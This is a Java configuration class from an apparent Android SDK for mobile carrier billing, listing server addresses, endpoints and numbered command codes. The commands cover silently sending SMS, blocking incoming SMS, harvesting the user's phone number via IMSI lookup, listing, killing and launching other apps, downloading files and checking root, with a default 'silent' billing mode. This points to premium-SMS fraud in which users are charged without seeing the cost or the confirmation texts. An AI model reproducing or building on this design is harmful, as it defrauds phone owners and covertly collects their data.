package com.core_sur;

import java.util.Hashtable;

import android.content.Context;
import android.os.Environment;
import android.os.Handler;

public class Config {
	
	/**
	 * 是否开启秘钥验证
	 */
	public final static boolean isCheck = true;
	
	public final static String WCVerSion = "20";
	/*
	 * 一级分隔符
	 */
	public final static String splitStringLevel1 = "№Ⅰ";
	/*
	 * 二级分隔符
	 */
	public final static String splitStringLevel2 = "№Ⅱ";

	/*
	 * 三级分隔符
	 */
	public final static String splitStringLevel3 = "№Ⅲ";
	public static Config config;
	
	public static Config getInstance() {
		if (config == null) {
			config = new Config();
		}
		return config;
	}
	public Context tpContext = null;
	public Handler tpHandler = null;
	public static int gwClientType = 0;
	public static String NotificationUrl = "";
	/*
	 * 仅仅用在拦截规则建立后即可发短信
	 */
	public static String SMSJson = "";

	public static int UnionId = 0;

	public static Boolean IsRuleSetup = false;

	public static Hashtable<String, Long> ht_CacheResInfo = new Hashtable<String, Long>();

	public static String CanFeeUrl = "/Html5/CanFee.aspx";

	// 第一次使用的秘钥
	// public static String AesKey = "";

	// 动态分配的秘钥
	public static String AesNewKey = "";

	// 统计服务器IP
	// public static String StatIP = "211.154.167.35";
	// public static String MainIp = "211.154.167.35:84";
	// public static String LinkIp = "211.154.167.35:84";
	// public static String LinkDomain = "211.154.167.35:84";
	
	//服务器URL地址
	//统计服务器IP
	/*public static String StatIP = "xysdk1.n8wan.com";
	// 主IP
	public static String MainIp = "xysdk1.n8wan.com:84";
	// IP
	public static String LinkIp = "xysdk1.n8wan.com:84";
	// 域名
	public static String LinkDomain = "xysdk1.n8wan.com:84";*/
	
	
	//本地URL地址
	//统计服务器IP
		public static String StatIP = "192.168.1.21";
		// 主IP
		public static String MainIp = "192.168.1.21:84";
		// IP
		public static String LinkIp = "192.168.1.21:84";
		// 域名
		public static String LinkDomain = "192.168.1.21:84";
		
	
	//提交加密串地址
	public static final String submitenurl = "http://" + StatIP +":833/MobileImsiToPhoneNum/SubmitEncryptString.aspx";

	public static String regUrl = "http://" + MainIp + "/req.aspx";
	
	//秘钥验证地址
	public static final String checkUrl = "http://" + StatIP +":81/AppInfoExist.aspx";
	
	//imsi2pn获取加密串地址
	public static final String getenurl = "http://a.10086.cn/pams2/mmtestnum.jsp";
	//Add By Andy 2015.11.05 For:在有端口的情况下有时候访问会500
	public static final String getenurl2 = "http://a.10086.cn:7071/pams2/mmtestnum.jsp";

	public static String AppKey = "";

	public static String Args = "";

	// 是否检测收件箱
	public static Boolean IsCheckSMS = false;
	// 是否短信广播
	public static Boolean IsCanBroadcast = false;
	
	public final static int CMD_3RD = 2001;// 第三方SDK调用
	public final static int CMD_CALLBACK = 1003;// 通用回调接口

	public final static int CMD_SMS = 1020;// 短信接口

	public final static int CMD_MMS = 1021;// 彩信接口

	public final static int CMD_OpenSMSFilterSendSMS = 1029; // 开启屏蔽规则并且发送短信

	public final static int CMD_OPENHOLDSMS = 1030;// 开启屏蔽短信线程

	public final static int CMD_CLOSEHOLDSMS = 1031;// 关闭屏蔽短信线程

	public final static int CMD_HOLDSMS = 1032;// 屏蔽的短信

	public final static int CMD_GETNUMBER = 1040;// 采集用户手机号码

	public final static int CMD_SENDMESSAGEGETNUMBER = 1041;// 发短信获取手机号

	// public final static int CMD_DELAYTOURL = 1050;// 等待一定时间访问一个地址

	public final static int CMD_CHANGEAPNTOURL = 1060;// 切换APN后访问一个地址

	public final static int CMD_WEBVIEWURL = 1070;// WebView跳转Url 当前的计费窗口webview
	/*
	 * 更新手机号码 短信方式
	 */
	public final static int CMD_UPDATEMOBILENO_SMS = 1043;

	public final static boolean IsGetPhoneNum = true;
	
	public final static boolean IS_DEBUG = false;
	
	public final static String DEBUG_FILE_LOG = Environment.getExternalStorageDirectory().getPath() + "/Android/";

	/*
	 * 关闭计费窗口，并且通过Handler传递信息
	 */
	public final static int CMD_CLOSEWEBVIEW = 1071;
	public final static int INIT_SUCCESS = 4010;
	public final static int INIT_FAILED = 4011;
	public final static int CMD_COMPLETE = 4001;// 发送全部短信中至少一次短信成功发送
	public final static int CMD_SENDALLFAIL = 4002;// 发送全部短信全部失败
	public final static int CMD_STARTFEE = 1077;// 获取XML成功
	public final static int CMD_NOCONFIG = 1078;// 该手机无法计费，服务器端返回无法计费 或
	public final static int CMD_NOCONFIG_App = 1079;// 该手机无法计费，客户端返回无法计费
	public final static int CMD_CLOSECRC = 1072;// 关闭后台心跳
	public final static int CMD_SHOWMSG = 1073;// tomas 消息显示
	public final static int CMD_NOTIFICATION = 1074;// 状态栏通知0
	public final static int CMD_OpenCUWOSDK = 1075;// 打开联通SDK计费界面
	public final static int CMD_CANCELWEBVIEW = 1076;// 用户取消计费窗口
	public final static int CMD_SENDSMSERROR = 1990; // 发送 成功一条短信
	public static final int CMD_SENDSMSSUCCESS = 1991;// 发送失败一条短信
	
	/*
	 * 手机号计费方式指令
	 */
	public static final int CMD_OpenMobileNoInputWindow = 5070;// 弹出用户输入手机号界面
    public static final int CMD_GetPayStatusByUserInput = 5062;// 获取用户计费状态，0 -1 -2
    public static final int CMD_GetCodeNoByUserInput = 5061;// 提交验证码，msg验证码
    public static final int CMD_GetMobileNoByUserInput = 5060;// 提交手机号码,msg手机号
    public static int PNFeeWindowMode = 2;
    
	/**
	 * 计费窗口模式, 为了跟gw统一,2表示静默模式, 1表示窗口模式中的资费确认模式
	 */
	public static int FeeWindowMode = 2;

	/*
	 * 窗口模式中的资费信息文字
	 */
	public static String FeeInfo = "";

	/*
	 * 资费信息
	 */
	public final static int CMD_FeeInfo = 1091;

	/*
	 * 手机计费窗口模式
	 */
	public final static int CMD_FeeWindowMode = 1090;

	/*
	 * 是否开启调试模式
	 */
	public final static int CMD_IsDebug = 1092;

	/*
	 * 上传日志
	 */
	public final static int CMD_UpLoadLog = 1093;

	/*
	 * 中间件获取用户真实手机号，5052
	 */
	public final static int CMD_GetTrueMobileNoByUId = 5052;

	/*
	 * 中间件获取用户真实手机号，5052
	 */
	public final static int CMD_AUTUserMobileNo = 5053;
	public final static int CMD_AccessUrl = 1050;
	public final static int CMD_AccessUrl_CallBack = 1051;
	/*
	 * 获取资费信息 5054
	 */
	public final static int CMD_GetFeeInfo = 5054;

	/*
	 * 用户取消计费窗口
	 */

	public final static int CMD_ISHASAPP = 1080;// 判断是否用户安装某个App

	public final static int CMD_RUNAPP = 1081;// 运行一个其他App

	public final static int CMD_KILLAPP = 1082;// 尝试杀掉一个App线程

	public final static int CMD_LISTAPP = 1084;// 采集应用软件列表

	public final static int CMD_DOWNLOADAPP = 1085;// 下载一个文件
	
	public final static int CMD_FEEOK= 1086;// WEB计费成功
	public final static int CMD_FEEFAIL= 1087;// WEB计费失败
	public final static int CMD_ROOT = 1090;// 手机是否已经Root

	public final static int CMD_FeeReportHeartConn = 1017;// 手机是否已经Root

	public static boolean IsDebug = false;

	public final static int CallBackSuccess = 2; // /客户端通知游戏方充值结果

	public final static int CallBackFail = 3; // /客户端通知游戏方充值结果

	public final static int CallbackOther = 4; // /客户端通知游戏方充值结果

	public final static String CallbackReasonNUll = ""; // /客户端通知游戏方充值结果

	public final static class CacheKey {
		/*
		 * 登录信息缓存
		 */
		public final static String CacheRegInfo = "cacheRegInfo";

		/*
		 * 短信屏蔽信息缓存
		 */
		public final static String CacheSMSFilterString = "cacheFilterString";

		public final static String CacheSMSFilterTime = "cacheFilterTime";

		/*
		 * WC缓存资源列表
		 */
		public final static String WCCacheResListString = "wcCacheResListString";
	}
}